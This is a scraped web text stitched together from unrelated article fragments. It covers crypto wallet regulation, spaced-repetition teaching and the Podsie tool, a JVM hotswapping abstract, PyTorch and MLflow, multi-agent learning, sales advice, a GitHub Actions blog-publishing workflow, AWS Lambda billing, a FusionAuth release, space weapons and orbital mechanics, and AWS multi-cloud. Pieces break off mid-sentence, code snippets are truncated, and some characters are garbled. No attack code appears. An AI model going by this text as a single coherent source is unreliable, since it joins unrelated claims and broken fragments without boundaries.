Such regulations appear more symbolic than anything else — they might scare newbies looking to enter the market discreetly, but anyone who understands how cryptocurrency storage works, especially when using hardware wallets, knows there are options outside of centralized exchanges.</p><p>Consider the scenario where the US Treasury makes good on their threat to enforce data collection on crypto wallets. Now, Coinbase requires you to KYC your wallet before allowing you to withdraw freshly purchased BTC. What are your options?</p><p>For one thing, you can use a decentralized exchange to trade crypto. Uniswap has already surpassed Coinbase in terms of trading volume — if crypto wallets regulations come into play, expect Uniswap to get much more action.</p><p>Moreover, with the push toward DeFi in the cryptocurrency industry, along with endless options for swapping liquidity, the likelihood that centralized exchanges stay relevant gets slimmer every day.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1606858594054_15299"><div>

That's why blockchains are built to enable censorship-free financial access.</p><p>As CoinDesk noted <a href="https://www.coindesk.com/crypto-wallet-regulations-industry-pros">in a recent analysis of the situation</a>, there exists a revealing difference in the language used to refer to crypto wallets by regulators and crypto investors.</p><p>Regulators call crypto wallets <em>unhosted wallets,</em> whereas investors refer to them as <em>self-hosted wallets</em>. The difference here is all about privacy — crypto users believe in financial independence, freedom from oversight, and digital asset autonomy.</p><p>On the other hand, an unhosted wallet points to the view that such wallets lack hosting — a situation that should be remedied by regulation and the cooperation of centralized institutions.</p><p>This seemingly small difference in language does indeed point to a large divide in exactly how each side views the purpose of storing crypto assets.</p><p>As Armstrong noted in his original Twitter thread, the crypto industry has been preparing for this eventuality for at least a few months. In fact, they've known long enough to form a lobby, and have responded to the rumors by sending the US Treasury a plea to leave crypto alone.</p><p>The regulation is expected to come into effect before the year's end, mostly owing to the US election results and the impending changing of the guard. As such, the rush is on for Mnuchin to push through regulations before time is up.</p><p>Does data-collection on self-hosted crypto wallets amount to the US government declaring a ban on cryptocurrency wallets we know them?</p><p><strong>Not really</strong>.</p><p>Moreover, can the government enforce these regulations and push people onto the centralized platforms decentralized blockchains were built to avoid?</p><p>The answer there is clearer: <strong>certainly not.</strong></p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1606858594054_28135"><div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>When my students bombed their first semester exam, it shocked me. It was my second year of teaching eighth grade math, and unlike the previous year, my students had actually done well on the exit tickets and tests up to that point. However, my students seemed to have forgotten everything.</p><p>The next semester, I made a concerted effort to carve out time for review, but it was tedious, and I never knew which specific topics to review, and how often to review each topic.</p><p>Years later when I was no longer a teacher, I found out that there was actually a science behind the best way to review, and that there was also <a href="https://www.gwern.net/Spaced-repetition" target="_blank" rel="noopener noreferrer">a large body of research to back it up</a>.</p><h5>Ebbinghaus and the Forgetting Curve</h5><p>This body of research goes as far back as the 1880s, when a German psychologist named Hermann Ebbinghaus mapped out memory and how we forget over time.</p><p><img src="https://www.researchgate.net/profile/Bo_Ae_Chun/publication/324816198/figure/fig1/AS:620205050982405@1524879815703/Ebbinghaus-forgetting-curve-and-review-cycle.png" alt="Forgetting Curve"></p><p>In his model of memory, Ebbignhaus stated that when content is first learned, without review, memory of that content deteriorates quickly. However, with each subsequent review and retrieval of that information, the memory becomes more durable, and over time, less and less review is required to keep retention fresh.</p><p>When I first learned about this, I felt an "Aha!" moment as Ebbinghaus broke down exactly why my students struggled when I was teaching.</p><p>For me, because planning out new lessons was already such a tough process, I never had enough time to adequately review throughout the school year. Instead, every year in March, I dedicated an entire month to review all of the content before the state exam. In fact, several lower-performing districts encouraged students and teachers to have â€œreview weeksâ€� to cram review before state assessments. We would power through countless hours of material that students had already "learned", but it never stuck as well as I would have liked.</p><p>Ebbinghaus proposed something that I had always intuitively known, but failed to put into practice in my own classroom: spreading out review over time is much more effective than cramming it all into one session.</p><h5>More Research</h5><p>Since Ebbinghuas, several researchers have fleshed out this idea of the forgetting curve and spaced review.</p><p>To start, <a href="https://www.podsie.org/blog/spaced-practice-in-the-classroom/(https://pcl.sitehost.iu.edu/rgoldsto/courses/dunloskyimprovinglearning.pdf)" target="_blank" rel="noopener noreferrer">John Dunlosky, a professor of psychological sciences at Kent State University, and others broke down 10 different learning techniques</a>, including common practices like re-reading and highlighting, and found that spaced review was one of the most effective ways to learn and retain knowledge and skills.</p><p>Meanwhile, <a href="https://pcl.sitehost.iu.edu/rgoldsto/courses/dunloskyimprovinglearning.pdf" target="_blank" rel="noopener noreferrer">Sean Kang, a cognitive psychologist at the University of Melbourne, highlighted spaced review as a highly effective learning technique</a> that does not require more time and drastic changes to the classroom.</p><p>Specifically, he states:</p><blockquote><p>Incorporating spaced practice into education can be a cost-effective approachâ€” learning becomes more durable in the same amount of time (relative to massed practice), and this can lead to future savings because less time needs to be spent on relearning content that has been forgotten, leaving more time for other productive learning activities (e.g., higher order analysis, application of knowledge). <strong>In short, spaced practice enhances the efficacy and efficiency of learning, and it holds great promise as an educational tool.</strong></p></blockquote><p>In a different paper, <a href="https://scottbarrykaufman.com/wp-content/uploads/2014/01/Lindsey-et-al.-2014.pdf" target="_blank" rel="noopener noreferrer">Robert Lindsey, another research scientist and now the founder of Imagen Technologies, and others also assessed the efficacy of a computer program that personalized review for each student over time</a>. In this study, personalized spaced review improved retention by 16.5%!</p><p>The more research I read, the more I was perplexed â€”perplexed as to why I hadn't learned about this research-backed learning technique while I was teaching. I had sat through countless hours of professional development and undergone a long certification process, but I had never once heard about how to maximize learning in my classroom through spaced review.</p><p>Clearly, there was a gap between research and practical application, and I wanted to see if there was a way to fill that gap.</p><h5>Spacing in the Classroom</h5><p>So how would spaced review work in the classroom?</p><p>After I learned about spaced review, I shared it with my best friend, Chris, who is currently a science teacher in Texas. He also dug into the research and was excited to try it out in his classroom the next school year. He did a deep dive into all of the learning tools available to help him facilitate spaced review in the classroom. Most tools he came across seemed better suited for individual learners, and were not well-suited for the classroom.</p><p>Long story short, Chris and I decided to build out Podsie, a platform that fully automates spaced review in a personalized way for each student. With Podsie, Chris creates an exit ticket of around 5-8 questions that assesses the content that students learned that day. When students complete a question, the question goes into that student's personal deck.</p><p>Each student's personal deck is powered by a spacing algorithm that determines when the student should review a question again. Then, Chris gives his students 10 minutes in the beginning of class to complete every question that is due on their personal decks, ensuring that each student reviews exactly what they should be reviewing on that day.</p><p>With this approach, Chris no longer has to do the traditional cram session before state assessments. This year, even with distance learning, the spaced review has been so effective for him that he's decided to completely cut out that month of review that he also traditionally did. Like the quote from Sean Kang above predicted, spacing out review saved Chris a significant amount of time because "less time needs to be spent on relearning content that has been forgotten."</p><h5>Last Thoughts</h5><p>In Sean Kang's paper on spacing, he reflects:</p><blockquote><p>Despite over a century of research findings demonstrating the spacing effect, however, it does not have widespread application in the classroom. <strong>The spacing effect is â€œa case study in the failure to apply the results of psychological researchâ€� (Dempster, 1988, p. 627).</strong></p></blockquote><p>Podsie hopes to be that bridge between psychological research and the classroom.</p><p>We know this year has been extraordinarily challenging for everyone in the education system, and we hope that by providing an effective and efficient tool, each student and teacher's life can be made a little easier.</p><p><strong><em>If you're interested in using Podsie in your classroom to help with your students' retention of content, you can <a href="https://www.podsie.org/#sign-up">sign up here!</a></em></strong></p></div></div></div>]]>

<h2><span id="Abstract">Abstract</span></h2>
<p>The current hotswapping mechanism in the HotSpot VM only allows changing the bodies of methods at runtime. We are working on an approach that allows arbitrary changes. This talk is about our experiences implementing a prototype in HotSpot that supports adding and deleting of methods and fields as well as performing changes to the class hierarchy. What are the conditions for dynamic code evolution to have a clear semantics and what kind of changes should be forbidden? What are meaningful applications of dynamic code evolution for Java and their requirements? The talk will conclude with ideas for future work to make dynamic code evolution stable and performant.

Looking at the momentum in research, as shown on <a href="http://paperswithcode.com/trends">paperswithcode.com/trends</a>, we can see that the research community has embraced PyTorch as its tool of choice. Conversely, the enterprise and production users of the world such as Lyft Level 5, Microsoft, AstraZeneca and many others, are realizing real product value through deploying PyTorch at scale. MLOps and end-to-end lifecycle management of machine learning is an important bridge between these communities, and the combination of state of the art AI developed on PyTorch and MLOps is a powerful force that will bring the impact of cutting edge research to products.</p><p>Today, we are announcing a number of technical contributions to enable end-to-end support for MLflow usage with PyTorch, including support for: autologging via PyTorch Lightning; TorchServe integration through a new deployment plug-in; and a sample end-to-end workflow targeting HuggingFace Transformers. This work, done in collaboration between members of the technical teams at Databricks/MLflow core maintainers and the PyTorch core development team within Facebook, is just the beginning.

However, the real world is not zero-sum nor does it have fixed teams; humans face numerous social dilemmas and must learn when to cooperate and when to compete. To successfully deploy agents into the human world, it may be important that they be able to understand and help in our conflicts. Unfortunately, selfish MARL agents typically fail when faced with social dilemmas. In this work, we show evidence of emergent direct reciprocity, indirect reciprocity and reputation, and team formation when training agents with randomized uncertain social preferences (RUSP), a novel environment augmentation that expands the distribution of environments agents play in. RUSP is generic and scalable; it can be applied to any multi-agent environment without changing the original underlying game dynamics or objectives. In particular, we show that with RUSP these behaviors can emerge and lead to higher social welfare equilibria in both classic abstract social dilemmas like Iterated Prisoner's Dilemma as well in more complex inter-temporal environments.</p><p><a href="https://arxiv.org/pdf/2011.05373.pdf">... keep reading</a></p></blockquote><p>The Rundown</p><ul data-rte-list="default"><li><p><a href="https://arxiv.org/pdf/2011.05373.pdf">Article</a></p></li><li><p><a href="https://github.com/openai/multi-agent-emergence-environments">OpenAI Multi-agent Emergence Environments</a></p></li><li><p>Credit: <a href="https://twitter.com/bobabowen">@bobabowen</a> at <a href="https://twitter.com/bobabowen">@OpenAI</a></p></li></ul></div></div><div data-block-type="2" id="block-53f769d2554fd04a77c0"><div><h2>Stay Up To Date</h2><p>That's all for ML UTD #25.

<p>As a teenager, I was very shy and insecure. Especially when it came to the important stuff: women.</p>



<p>I remember being terrified of talking face-to-face to the girl who could’ve been my first girlfriend… had I talked to her.</p>



<p>Fast-forward 6–7 years.</p>



<p>I’m working as a B2C salesman in an international education agency, closing deals worth thousands, sometimes even tens of thousands of dollars.</p>



<p>But how the hell did that happen? Well, I learned how to sell.</p>



<p>Selling is a skill anybody can learn, no matter how shy or insecure they are. And, as you can tell from my story, it’s a skill with a very high ROI — it literally changes your life. It feels almost like a superpower.</p>



<p>If you want to make a living as an independent creator business you need to know how to sell. Because as a business, cash is your oxygen. And without sales there’s no cash.</p>



<p>It doesn’t matter how cheap, beautiful or amazing the product you’re building is — if you can’t make people pay you money for it, you won’t get very far.</p>



<p>Once you learn how to sell, my friend, you are unstoppable.</p>

Perhaps by reducing the effort required for the next step? Let’s do it!</p><h2 id="architecture">Architecture</h2><p>My blog is statically generated using <a href="https://github.com/gohugoio/hugo">Hugo</a>, the <a href="https://github.com/shazow/shazow.net">code is hosted on Github</a>, then when a pull request comes in it is built, previewed, and published on merge by <a href="https://netlify.com/">Netlify</a>.</p><p>The blog post drafts are posted as Github issues, so there is a clear gap: How do we convert issues into pull requests for Netlify? Enter Github Actions!</p><h2 id="github-action-issue-to-pull-request">Github Action: Issue to Pull Request</h2><p>My <a href="https://github.com/shazow/shazow.net/blob/master/.github/workflows/publish.yml">full workflow lives here</a> if we want to jump ahead, but let’s break down the broad strokes.</p><p>I decided to trigger the publishing process once an issue is labelled with ‘publish’, so let’s start with that:</p><div><pre><code data-lang="yaml"><span>name</span><span>:</span><span> </span>Publish<span> </span>post<span> </span>from<span> </span>issue<span>

</span></code></pre></div><p>Next up we want to specify the steps, first thing is to check out the repository into the action’s environment:</p><p>Once the source code is available, we want to generate the blog post from the issue metadata. Here is a very basic version of this, though I ended up doing more tweaking in the end:</p><div><pre><code data-lang="yaml"><span>      </span>- <span>name</span><span>:</span><span> </span>Generate<span> </span>Post<span>

</span><span>          cat &gt; "content/posts/${POST_TITLE}.md" &lt;&lt; EOF</span><span>
</span><span>          </span>${POST_BODY}<span>
</span><span>          </span>EOF<span>
</span></code></pre></div><p>This shoves the body of the issue, which is already markdown, into a markdown file named based on the title of the issue. This is a good place to add frontmatter, or slugify the title, or whatever else your blog setup requires.</p><p>Running the payload through environment variables helps with not needing to escape various characters like `.</p><p>And finally, we make the pull request using Peter Evan’s create-pull-request action which makes this super easy:</p><p>This is the minimum of what we need, but we can specify all kinds of additional options here: like auto-deleting the branch, setting a custom title, body, and whatever else. Here’s an example of what I’m doing:</p><div><pre><code data-lang="yaml"><span>      </span>- <span>name</span><span>:</span><span> </span>Create<span> </span>Pull<span> </span>Request<span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="8a920a5" data-element_type="widget" data-widget_type="theme-post-content.default"><div><p>One of the biggest serverless announcements from <a href="https://reinvent.awsevents.com/">AWS re:Invent 2020</a> is 1 ms billing for <a href="https://aws.amazon.com/lambda/pricing/">AWS Lambda</a> functions. This is an industry-leading change that fundamentally alters the cost of running many serverless applications.</p><p>In this post, I explain the impact and show how you can optimize your Lambda functions to take advantage of this new feature. This can help you drive down the cost of running serverless applications even further.</p><h2 id="h-how-lambda-billing-works">How Lambda billing works</h2><p>Lambda is an on-demand compute platform – it only runs in response to events, and you only pay when code is running.&nbsp;</p><p>There are two dimensions to <a href="https://aws.amazon.com/lambda/pricing/">Lambda pricing</a> – requests and duration. A request happens anytime that a function is invoked and these are charged at $0.20 per million, regardless of function size. Duration is calculated as a factor of time and memory usage at $0.0000166667 per GB-second. There is also a <a href="https://aws.amazon.com/free/?all-free-tier.sort-by=item.additionalFields.SortRank&amp;all-free-tier.sort-order=asc&amp;awsf.Free%2520Tier%2520Categories=categories%2523serverless">Free Tier</a> allowance of 1 million requests and up to 400,000 GB/s of compute every month. You are not charged for any Lambda usage under this level.</p><p>Before this announcement, the minimum duration for billing was 100 ms and the billable duration was always rounded up to the nearest 100 ms. This means that a function with 5 ms was rounded to 100 ms and a function with 385 ms duration was rounded to 400 ms. With the move to 1 ms billing, the smallest duration value is now 1 ms and all other usage is rounded up the next 1 ms.</p><h2 id="h-from-100-ms-to-1-ms-rounding-the-cost-difference-for-existing-code">From 100 ms to 1 ms rounding –the cost difference for existing code</h2><p>Lambda is designed for very high volumes of traffic and many production-based applications result in millions of invocations. This change in the duration granularity provides cost savings for almost all Lambda functions, and this will automatically appear on your AWS billing statement.&nbsp;</p><p>To see the impact of this pricing change for different function durations, I compare three types of Lambda function:</p><ol><li>Short-lived (~100 ms): these typically operate as “glue”, minimally processing data between AWS services.</li><li>Subsecond (under 1 second): for more complicated business logic handling more data.</li><li>Longer-lived functions (under 1 minute): for computationally complex logic, or functions calling out synchronously to third-party services.</li></ol><p>The following table takes a random sampling of durations for these three types of functions, then rounds the billable duration by 1 ms and 100 ms granularity:</p><figure><img loading="lazy" width="468" height="159" src="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/12/image.png" alt="" srcset="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/12/image.png 468w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/12/image.png 300w" sizes="(max-width: 468px) 100vw, 468px"></figure><p>This shows that the change to billable duration has the most impact on the cost of running short-lived functions, with up to 67% shorter billable durations in this example. For subsecond functions, the example shows a 10% drop in average duration, while it has less impact for longed-lived functions.</p><p>In practice, in most production workloads, Lambda functions run for brief amounts of time, so there are good opportunities for optimization here.</p><h2 id="h-memory-cost-and-duration">Memory, cost, and duration</h2><p>One of the major configuration levers available to you as a Lambda developer is memory. You can set the allocated memory from 128 MB to 10 GB in 64 MB increments. However, memory also controls the amount of virtual CPU available to your function, ranging from a percentage of a single core at 128 MB to six full virtual CPUs at maximum memory.</p><p>For many compute-intensive functions, increasing the memory shortens the overall duration. This means you can achieve a faster function with a negligible impact on cost in many cases. To find the optimal balance for your functions, there are a couple of options. You can manually test a function with different memory allocations to measure the effect on duration, or you can use the <a href="https://github.com/alexcasalboni/aws-lambda-power-tuning">AWS Lambda Power Tuning</a> tool.&nbsp;</p><p>This tool helps automate finding the balance between memory, duration and cost, and visualizes the results. For example, a compute-intensive function is evaluated at different memory levels. The resulting chart shows it performs fastest at 3008 MB but the lowest cost occurs at 1024 MB and 1536 MB:&nbsp;</p><figure><img loading="lazy" width="468" height="227" src="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/12/image-1.png" alt="" srcset="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/12/image-1.png 468w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/12/image-1.png 300w" sizes="(max-width: 468px) 100vw, 468px"></figure><p>When the minimum billing duration was 100 ms, there was no financial gain by optimizing functions that ran for less than 100 ms. While increasing memory may have reduced milliseconds in these cases, the overall cost increased due to the additional memory usage and no change in the duration minimum. However, with 1 ms billing, this all changes – it’s now worth optimizing the efficiency of these functions. There are many steps you can take to optimize these short-running functions.</p><h2 id="h-reusing-tcp-connections-in-node-js">Reusing TCP connections in Node.js</h2><p>In Node.js, the default HTTPS agent creates a new TCP connection for every new request. If you are interacting with services like DynamoDB, the latency of this operation can be greater than the time taken for the database request. This latency is also compounded if your service request uses the <a href="https://aws.amazon.com/kms/">AWS Key Management Service</a>.</p><p>You can change a setting to ensure that the TCP connection is reused by using a flag that was enabled by the <a href="https://aws.amazon.com/tools/">AWS SDK</a> from version <a href="https://github.com/aws/aws-sdk-js/blob/master/CHANGELOG.md#24630">2.463.0</a>. The easiest way to apply this is to use an environment variable in your Lambda functions. By setting <em>AWS_NODEJS_CONNECTION_REUSE_ENABLED</em> to 1, warm invocations of the function will then reuse the connection.&nbsp;</p><p>This section refers to an example application in this <a href="https://github.com/aws-samples/building-faster-aws-lambda-functions">code repo</a>. I compare the latency of putting an item into an <a href="https://aws.amazon.com/dynamodb/">Amazon DynamoDB</a> table, with and without the reuse flag. I run a <a href="https://aws.amazon.com/blogs/compute/load-testing-a-web-applications-serverless-backend/">load test</a> on each function for 1000 request over 300 seconds. Using this <a href="https://docs.aws.amazon.com/AmazonCloudWatch/latest/logs/AnalyzingLogData.html">CloudWatch Insights</a> query, I can then analyze the duration averages and percentile metrics:</p><div><div><div><div><pre>filter @type = "REPORT"

Your use-case will determine which ones you can apply.</p><p>First, your choice of runtime makes a difference. Although the Lambda service is agnostic to runtime, some runtimes are faster to initialize than others. For short functions, consider using runtimes like Node.js, Go and Python, which can typically run more quickly.</p><p>Keep your deployment package sizes as small as possible since larger packages often take longer to initialize. You should remove any requirements or library imports that are not used directly by the function. Also, avoid “monolithic” functions that contain multiple code paths, and minify your code wherever possible to help get the deployment package size as small as it can be.</p><p>Ensure that any global objects that require initialization, such as database connections, are defined in the global scope. This is the code outside of the Lambda handler function, also known as “INIT” code.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
              <p>We’re excited to announce the release of version 1.22 of FusionAuth. This release shipped on Dec 1, 2020. This version delivers new features as well as resolving issues for users on version 1.21 and older.</p>

<!--more-->

<h2 id="highlights">Highlights</h2>

<p>In addition to bug fixes and enhancements, there are a couple of new improvements I wanted to highlight.</p>

<h3 id="elasticsearch-improvements">Elasticsearch improvements</h3>

<p>Elasticsearch is one of the two search engines available for FusionAuth. (If you aren’t sure which one to choose, you can read about the <a href="https://fusionauth.io/docs/v1/tech/core-concepts/users/#user-search">strengths and limitations of each</a>.)</p>

<p>This release includes improvements to Elasticsearch. You may now specify the index name, using any of the configuration options (environment variable, system property or configuration file option). You might want to do this if you are running multiple instances of FusionAuth, perhaps for different development environments, but using the same Elasticsearch cluster. See the <a href="https://fusionauth.io/docs/v1/tech/reference/configuration/">configuration reference documentation</a> for more details.</p>

<p>You don’t typically have to reindex Elasticsearch in a production environment, but sometimes you want to. This operation can be done from the administrative user interface by navigating to “System” and then “Reindex”. The reindexing process has been substantially reworked in 1.22, and you can now reindex 1M users in approximately 100 seconds. Performance does depend on hardware and other system activity, however.</p>

<h3 id="asynchronous-tenant-deletion">Asynchronous tenant deletion</h3>

<p><a href="https://fusionauth.io/docs/v1/tech/core-concepts/tenants/">Tenants</a> are useful in many situations, and FusionAuth supports unlimited tenants. You can use them for private labeling your application, for different dev/test/qa environments, or for logical separation between different applications and API keys.</p>

<p>Tenants are also useful for testing bulk load migration scripts. When you use a tenant for this purpose, you’ll delete the tenant repeatedly. Doing so deletes all the applications, groups, users, and configuration associated with a tenant. There’s no going back when you delete a tenant, so FusionAuth asks you to confirm it:</p>

<p><img src="https://fusionauth.io/assets/img/blogs/release-1-22/delete-screen.png" alt="The delete tenant confirmation screen."></p>

<p>Deleting all these entities can take some time. The <a href="https://fusionauth.io/docs/v1/tech/apis/tenants/#delete-a-tenant">delete operation</a> can now be asynchronous using the API and passing <code>async=true</code>. Before this release, you had to ensure that your requesting client had a high timeout setting, as it had to wait for the entire operation to complete. When you’re loading millions of test users, that can take a fair bit of time.</p>

<p>With this release the API client can request a deletion and then poll periodically to see if the tenant deletion has finished. We say, let that API client rest a bit!</p>

<h2 id="bugs-squashed">Bugs squashed</h2>

<p>In addition to the above improvements, there were over ten other bugs squashed and GitHub issues resolved. These included increasing the third party identity provider timeout, a two factor authentication code request bug, and fixing an error during the login process when using an LDAP connector. Please see the <a href="https://fusionauth.io/docs/v1/tech/release-notes/#version-1-22-0">release notes</a> for the full breakdown of the changes between 1.21 and 1.22.</p>

<p>If you’d like to upgrade your self-hosted FusionAuth instance, see our <a href="https://fusionauth.io/docs/v1/tech/installation-guide/upgrade/">upgrade guide</a>.</p>

<p>If you have a FusionAuth Cloud deployment, open a <a href="https://account.fusionauth.io/account/support/" target="_blank">support request from your account dashboard</a> and we’ll get your servers upgraded!</p>

<p>Or, if we’ve piqued your interest and you’d like to download and use FusionAuth, <a href="https://fusionauth.io/pricing/">check out your options</a>.</p>

However, that war will (hopefully!) be slow and boring, with countries prioritizing directed energy and electronic attacks on satellites over kinetic ones so as to avoid creating debris that would deny space access as much to themselves as others. <a href="https://spaceflightnow.com/2020/07/23/u-s-officials-say-russia-tested-a-new-anti-satellite-weapon/" target="_blank">Russia</a>, the <a href="https://en.wikipedia.org/wiki/Anti-satellite_weapon#United_States_ASATs" target="_blank">US</a>, <a href="https://en.wikipedia.org/wiki/2007_Chinese_anti-satellite_missile_test" target="_blank">China</a>, &amp; <a href="https://carnegieendowment.org/2019/04/15/india-s-asat-test-incomplete-success-pub-78884" target="_blank">India</a> all have direct ascent anti-satellite weapons (with the latter three countries having spread space debris during ill-conceived weapons tests), and <a href="https://en.wikipedia.org/wiki/Arrow_3#:~:text=Arrow%203%20may%20serve%20as%20an%20anti-satellite%20weapon" target="_blank">Israel may as well</a>. At least the US and Russia also have <a href="https://www.theverge.com/2020/7/23/21335506/russia-anti-satellite-weapon-test-kosmos-2543" target="_blank">anti-satellite satellites</a> that <a href="https://www.theverge.com/2020/1/31/21117224/russian-satellite-us-spy-kosmos-2542-45-inspection-orbit-tracking" target="_blank">maneuver around</a> and muck with other satellites in undefined ways. These countries also likely have ground and satellite-based jammers and lasers (both dazzling and destructive). Satellites are very hard to defend because they have predictable orbits and very limited maneuvering budgets, so instead of having a few <a href="https://spacenews.com/the-end-of-sbirs-air-force-says-its-time-to-move-on/" target="_blank">exquisite satellites as the US military does now</a>, the US DOD is following (and <a href="https://www.theverge.com/2020/10/6/21503165/spacex-space-development-agency-contract-missile-warning-satellites-starlink" target="_blank">employing</a>) the NewSpace industry toward a proliferation of small, disposable satellites. Related: A <a href="https://aerospace.org/sites/default/files/2020-10/Reesman_PhysicsWarSpace_20201001.pdf" target="_blank">PDF entitled “The physics of space war: how orbital dynamics constrain space-to-space engagements”</a> from Aerospace Corp. talks about how the limited ∆v budgets of space vehicles limits warfare and makes planning and timing essential to an attack. (The PDF, oddly, has the following invisible text on the first page: “<em><span>THIS MATERIAL IS BEING PROVIDED PRE-RELEASE SOLELY FOR THE USE OF GEN. JAMES DICKINSON, AND IS NOT APPROVED FOR RELEASE</span>.</em>”)</p></div><!--[if mso]> <![endif]--> <!--[if mso]></table><![endif]--></div><div> <!--[if mso]><table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;"><tr> <![endif]--> <!--[if mso]><td valign="top" width="600" style="width:600px;"> <![endif]--><div><p><a href="#catching-the-iss-and-other-orbital-maneuvers">¶</a><strong id="catching-the-iss-and-other-orbital-maneuvers">Catching the ISS and other orbital maneuvers.</strong> When covering space missions, we often talk about ∆v (like how <a href="http://orbitalindex.com/archive/2019-03-05-archive-Issue-2/#the-beresheet-lunar-lander-performed-its-first-orbit-raising-burn" target="_blank">Beresheet's ∆v budget was minuscule</a> for a lunar mission), orbital inclinations (Starlink’s <a href="https://directory.eoportal.org/web/eoportal/satellite-missions/s/starlink" target="_blank">53° inclination</a> leads to its service coverage stopping around latitudes of 53°), and in-space rendezvous (ex. <a href="https://en.wikipedia.org/wiki/Mission_Extension_Vehicle" target="_blank">MEV-1</a>, Crew Dragon's <a href="https://youtu.be/3hK540tMmvw" target="_blank">approach to the ISS</a>, and the <a href="https://www.esa.int/ESA_Multimedia/Images/2020/11/ESA_tracks_Chang_e-5_Moon_mission" target="_blank">Chang'e 5 ascent vehicle’s upcoming lunar orbit rendezvous with its return vehicle</a>), but we rarely cover the concepts themselves, so here’s an exceptionally brief attempt. Orbital Mechanics has been around since well before artificial satellites were even remotely possible—for example, Walter Hohmann discovered his eponymous <a href="https://en.wikipedia.org/wiki/Hohmann_transfer_orbit" target="_blank">transfer orbit</a> in 1929. This simple transfer maneuver consists of two velocity changes, the first to elongate an orbital ellipse so that it intersects a target apogee and a second to circularize the ellipse (<a href="https://youtu.be/aKXNbf6NCKU" target="_blank">video explainer</a> 📺). Orbital plane changes, avoided whenever possible due to high energy cost, are completed by normal acceleration at the point around which the orbital plane should pivot. Meanwhile, rendezvous between two craft in different orbits often requires the application of multiple maneuvers (see <a href="https://www.spaceflightinsider.com/missions/human-spaceflight/breakdown-of-crew-1-flight-plan-an-inside-look/" target="_blank">Crew-1's flight plan</a>). Timing an orbital transfer is key, as the maneuvering spacecraft must give the target the correct lead time or it will end up&nbsp;in front or behind. Rendezvousing with another object in the same orbit is perhaps the most counterintuitive, as you must adjust your orbital period by leaving the shared orbit and later re-entering it. To "slow down" you accelerate to increase the height of your orbit, lengthening your orbital period relative to the other craft, let time pass, and then re-enter the original orbit once they've caught up. Conversely, to catch up, you decrease velocity to achieve a smaller, more eccentric orbit, which has a shorter orbital period. There are tons of resources out there for diving into the math of orbital mechanics (and related concepts like the <a href="https://en.wikipedia.org/wiki/Oberth_effect" target="_blank">Oberth effect</a> and Sun-synchronous orbits that are only possible because of torque from the <a href="https://en.wikipedia.org/wiki/Equatorial_bulge" target="_blank">Earth’s equatorial bulge</a>). Surprisingly, an easy read comes from the FAA's Office of Aerospace Medicine <a href="https://www.faa.gov/about/office_org/headquarters_offices/avs/offices/aam/cami/library/online_libraries/aerospace_medicine/tutorial/section3/spacecraft_design/" target="_blank">as part of their "Advanced Aerospace Medicine On-line" course</a> (we're not sure how Hohmann transfers relate to patching up wounded astronauts). You can also <a href="https://orbitalmechanics.info/" target="_blank">play with orbits in a simulator</a>, but we generally recommend <a href="https://www.kerbalspaceprogram.com/" target="_blank">Kerbal Space Program</a> if you really want to develop a more intuitive sense of two-body orbital mechanics while having a blast (pun very much intended). Sadly, KSP 2, the much-anticipated sequel with multiplayer support, <a href="https://www.polygon.com/2020/11/5/21551754/kerbal-space-program-2-release-date-delayed-2022" target="_blank">has now slipped to a 2022 release</a>.</p></div><!--[if mso]> <![endif]--> <!--[if mso]></table><![endif]--></div><div> <!--[if mso]><table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;"><tr> <![endif]--> <!--[if mso]><td valign="top" width="600" style="width:600px;"> <![endif]--><div> <strong>Papers</strong><ul><li> <a href="https://earthsky.org/space/is-it-true-that-jupiter-protects-earth" target="_blank">Jupiter may protect us from asteroids</a>, but it also likely prevented us from having siblings—had the solar system not had a gas giant, we might have up to 6 planets in our habitable zone (<a href="https://iopscience.iop.org/article/10.3847/1538-3881/ab9ffe" target="_blank">paper</a>).

AWS is giving you a single pane of glass that will let you roll out config updates, instrument monitoring, and connect other app services to container workloads on your cloud of choice.</p><p>That’s right: AWS just rolled out a multi-cloud container management service.</p><p>You are now permitted thirty seconds to pick your jaw off the floor.</p><h2 id="h-what-does-aws-gain-from-doing-this">What does AWS gain from doing this?</h2><p>This marks … shall we say … a bit of a departure from AWS’s classic “one cloud to rule them all” rhetoric. After all, at various other times in Tuesday’s re:Invent keynote Andy Jassy unleashed <a href="https://aws.amazon.com/rds/aurora/babelfish/">a frontal assault on Microsoft SQL Server</a>, dunked gleefully on archnemesis-turned-punching-bag Oracle, and found GCP so unthreatening that he closed his presentation, without comment, on a song lyric that used “Google” as a verb.</p><p>And yet multi-cloud is here to stay, and Jassy knows it.</p><p>Check out my recent piece <a href="https://cloudirregular.substack.com/p/aws-hearts-multi-cloud-its-gonna">“AWS Hearts Multi-Cloud”</a> for a full analysis of why, but here’s the gist. <a href="https://cloudpundit.com/2020/09/18/the-multicloud-gelatinous-cube/"><strong>Multi-cloud is a gravitational inevitability for enterprises</strong></a>. ACG’s recent <a href="https://acloudguru.com/blog/news/a-cloud-guru-unveils-state-of-cloud-learning-report">State of Cloud Learning Report</a> found that while about 75% of cloud shops still use AWS as their primary cloud provider, the same 75% also have at least some workloads running on Azure or another cloud. Could be due to acquisition, service envy, bet-hedging, or simple lack of coordination – or all of the above. Reality is messy and getting more so.</p><p>AWS has a huge head start on the rest of the cloud industry, 